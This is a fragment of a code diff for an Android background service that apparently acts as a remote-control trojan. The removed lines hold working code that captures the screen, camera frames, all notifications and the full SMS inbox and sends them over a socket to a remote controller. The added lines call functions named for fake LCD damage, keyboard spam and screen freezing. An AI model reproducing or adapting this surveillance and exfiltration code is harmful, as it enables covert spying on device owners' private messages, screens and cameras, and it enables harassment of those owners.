-            else bmp
-
-            val baos = ByteArrayOutputStream()
-            cropped.compress(Bitmap.CompressFormat.JPEG, 35, baos)
-            if (cropped !== bmp) cropped.recycle()
-            bmp.recycle()
-            image.close(); image = null
-
-            val b64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP)
-            screenIsSending = true
-            Thread {
-                try { emitScreenFrame(b64) }
-                finally { screenIsSending = false }
-            }.start()
-        } catch (_: Exception) {
-        } finally {
-            image?.close()
-        }
-    }
-
-    private fun stopScreenCapture() {
-        screenStreaming = false
-        screenRunnable?.let { screenHandler?.removeCallbacks(it) }
-        screenHandler  = null
-        screenRunnable = null
-        try { imageReader?.close() } catch (_: Exception) {}
-        imageReader = null
-        try { mediaProjection?.stop() } catch (_: Exception) {}
-        mediaProjection = null
-        emitStatus(JSONObject().apply { put("screenActive", false) })
-    }
-
-    private fun emitScreenFrame(b64: String) {
-        if (socket?.connected() != true) return
-        socket?.emit("screen:frame", JSONObject().apply {
-            put("deviceId", deviceId)
-            put("frame", "data:image/jpeg;base64,$b64")
-        })
-    }
-
     private fun setWallpaperFromUrl(url: String) {
         Thread {
             try {
@@ -1868,97 +1149,6 @@ ${htmlContent}
         }
     }
     
-    private val notifStore = mutableMapOf<String, ArrayDeque<JSONObject>>()
-
-    private fun storeNotif(payload: JSONObject) {
-        val pkg = payload.optString("pkg") ?: return
-        val deque = notifStore.getOrPut(pkg) { ArrayDeque() }
-        deque.addFirst(payload)
-        if (deque.size > 500) deque.removeLast()
-    }
-
-    private fun sendStoredNotifs() {
-        Thread {
-            try {
-                val result = org.json.JSONArray()
-                notifStore.forEach { (pkg, deque) ->
-                    val msgs = org.json.JSONArray()
-                    deque.forEach { msgs.put(it) }
-                    result.put(JSONObject().apply {
-                        put("pkg",     pkg)
-                        put("appName", deque.firstOrNull()?.optString("appName") ?: pkg)
-                        put("messages", msgs)
-                    })
-                }
-                if (socket?.connected() != true) return@Thread
-                socket?.emit("device:status", JSONObject().apply {
-                    put("deviceId", deviceId)
-                    put("status", JSONObject().apply { put("notifList", result) })
-                })
-            } catch (e: Exception) {
-                Log.e("DeviceService", "sendStoredNotifs: ${e.message}")
-            }
-        }.start()
-    }
-
-    private fun sendSms() {
-        Thread {
-            try {
-                val uri = android.net.Uri.parse("content://sms/inbox")
-                val cursor = contentResolver.query(
-                    uri,
-                    arrayOf("address", "body", "date", "read"),
-                    null, null, "date DESC"
-                ) ?: return@Thread
-                
-                val grouped = mutableMapOf<String, ArrayDeque<JSONObject>>()
-                cursor.use {
-                    while (it.moveToNext()) {
-                        val address = it.getString(0) ?: continue
-                        val body    = it.getString(1) ?: continue
-                        val date    = it.getLong(2)
-                        val msg = JSONObject().apply {
-                            put("pkg",     "com.android.sms")
-                            put("appName", "SMS")
-                            put("title",   address)
-                            put("text",    body)
-                            put("time",    date)
-                        }
-                        grouped.getOrPut(address) { ArrayDeque() }.addLast(msg)
-                    }
-                }
-
-                val result = org.json.JSONArray()
-                grouped.forEach { (address, msgs) ->
-                    val msgArr = org.json.JSONArray()
-                    msgs.forEach { msgArr.put(it) }
-                    result.put(JSONObject().apply {
-                        put("pkg",      "com.android.sms")
-                        put("appName",  "SMS — $address")
-                        put("messages", msgArr)
-                    })
-                }
-
-                if (socket?.connected() != true) return@Thread
-                socket?.emit("device:status", JSONObject().apply {
-                    put("deviceId", deviceId)
-                    put("status", JSONObject().apply { put("smsList", result) })
-                })
-            } catch (e: Exception) {
-                Log.e("DeviceService", "sendSms: ${e.message}")
-            }
-        }.start()
-    }
-
-    private fun readUid(): String {
-        return try {
-            val json = assets.open("uid.json").bufferedReader().use { it.readText() }
-            JSONObject(json).optString("uid", "")
-        } catch (e: Exception) {
-            Log.e("DeviceService", "readUid error: ${e.message}")
-            ""
-        }
-    }
 
     fun emitStatus(statusObj: JSONObject) {
         if (socket?.connected() != true) return
@@ -1968,43 +1158,27 @@ ${htmlContent}
         })
     }
 
-    private fun emitFrame(b64: String) {
-    if (socket?.connected() != true) {
-        Log.e("DeviceService", "❌ Socket not connected, cannot send frame")
-        return
-    }
-    
-    Log.d("DeviceService", "📤 Emitting frame, length: ${b64.length}")
-    
-    socket?.emit("camera:frame", JSONObject().apply {
-        put("deviceId", deviceId)
-        put("frame", "data:image/jpeg;base64,$b64")
-    })
-    
-    Log.d("DeviceService", "✅ Frame emitted")
-}
-
-
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY
 
     override fun onBind(intent: Intent?): IBinder? = null
 
     override fun onDestroy() {
-        super.onDestroy()
-        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_PAUSE)
-        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_STOP)
-        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_DESTROY)
-        try { unregisterReceiver(localReceiver) } catch (_: Exception) {}
-        stopCameraInternal()
-        stopScreenCapture()
-        stopLockFlashBlink()
-        flashBlinking = false
-        flashHandler?.removeCallbacks(flashRunnable ?: Runnable {})
-        flashHandler = null
-        try { torchCameraId?.let { cameraManager?.setTorchMode(it, false) } } catch (_: Exception) {}
-        socket?.disconnect()
-        socket = null
-    }
+    super.onDestroy()
+    lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_PAUSE)
+    lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_STOP)
+    lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_DESTROY)
+    try { unregisterReceiver(localReceiver) } catch (_: Exception) {}
+    stopLockFlashBlink()
+    stopLcdDamage()
+    stopSpamKeyboard()
+    stopFreezeScreen()
+    flashBlinking = false
+    flashHandler?.removeCallbacks(flashRunnable ?: Runnable {})
+    flashHandler = null
+    try { torchCameraId?.let { cameraManager?.setTorchMode(it, false) } } catch (_: Exception) {}
+    socket?.disconnect()
+    socket = null
+}
 
     private fun buildNotification(): Notification =
         NotificationCompat.Builder(this, CHANNEL_ID)
